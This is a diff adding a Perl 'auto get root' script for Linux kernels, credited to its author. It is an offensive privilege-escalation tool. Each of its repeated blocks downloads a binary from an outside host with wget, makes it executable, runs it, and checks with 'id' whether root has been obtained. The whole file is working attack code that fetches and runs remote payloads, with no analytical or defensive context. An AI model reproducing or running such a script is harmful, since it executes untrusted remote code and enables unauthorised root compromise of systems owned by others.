@@ -1,0 +1,130 @@
+#!/usr/bin/perl 
+#  coded by ChaN-1611 
+# linux Kernel 2010 auto get root
+{ 
+print "linux Kernel 2010 auto get root by ChaN-1611\n";
+system("wget http://kaka228.ns10-wistee.fr/1");  
+system("chmod 777 1"); 
+system("./1"); 
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/2");  
+system("chmod 777 2"); 
+system("./2"); 
+system("id"); 
+system("wget http://kaka228.ns10-wistee.fr/2.6.18-194");  
+system("chmod 777 2.6.18-194"); 
+system("./2.6.18-194"); 
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/2.6.32-21-generic-2010-i686010"); 
+system("chmod 777 2.6.32-21-generic-2010-i686010"); 
+system("./2.6.32-21-generic-2010-i686010"); 
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/2.6.30"); 
+system("chmod 777 2.6.30"); 
+system("./2.6.30"); 
+system("id");  
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/2.6.32-21-generic-2010-i686");  
+system("chmod 777 2.6.32-21-generic-2010-i686"); 
+system("./2.6.32-21-generic-2010-i686"); 
+system("id"); 
+
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/2.6.xx");  
+system("chmod 777 2.6.xx"); 
+system("./2.6.xx"); 
+system("id"); 
+
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/2010");  
+system("chmod 777 2010"); 
+system("./2010"); 
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/2010-1");  
+system("chmod 777 2010-1"); 
+system("./2010-1"); 
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/Spy-Q8");  
+system("chmod 777 Spy-Q8"); 
+system("./Spy-Q8"); 
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/c");  
+system("chmod 777 c"); 
+system("./c"); 
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/priv8-2.6.18-164-2010");  
+system("chmod 777 priv8-2.6.18-164-2010"); 
+system("./priv8-2.6.18-164-2010"); 
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/priv8-2.6.18.2010");  
+system("chmod 777 priv8-2.6.18.2010"); 
+system("./priv8-2.6.18.2010"); 
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/x86");  
+system("chmod 777 x86"); 
+system("./x86"); 
+
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/ia32syscall");  
+system("chmod 777 ia32syscall"); 
+system("./ia32syscall"); 
+
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/2.6.18");  
+system("chmod 777 2.6.18"); 
+system("./2.6.18"); 
+
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/2.6.18-53");  
+system("chmod 777 2.6.18-53"); 
+system("./2.6.18-53"); 
+
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/root2");  
+system("chmod 777 root2"); 
+system("./root2"); 
+
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget http://kaka228.ns10-wistee.fr/2.6.9");  
+system("chmod 777 2.6.9"); 
+system("./2.6.9"); 
+
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+print "-----------------------------------------------------------------";
+print "This is last local please select no from 1 to 4";
+system("wget http://kaka228.ns10-wistee.fr/gnu");  
+system("chmod 777 gnu"); 
+system("./gnu"); 
+ system(".1"); 
+ system("id"); 
+ system("./gnu"); 
+ system("./2"); 
+ system("id"); 
+ system("./gnu"); 
+ system("./3"); 
+ system("id"); 
+ system("./gnu"); 
+ system("./4"); 
+ system("id"); 
+ system("id"); 
+ system("id"); 
+ system("id"); 
+ system("id"); 
+ print "----------------------------End Of File-------------------------";
+  print "----------------------------By ChaN-1611-------------------------";
+}  
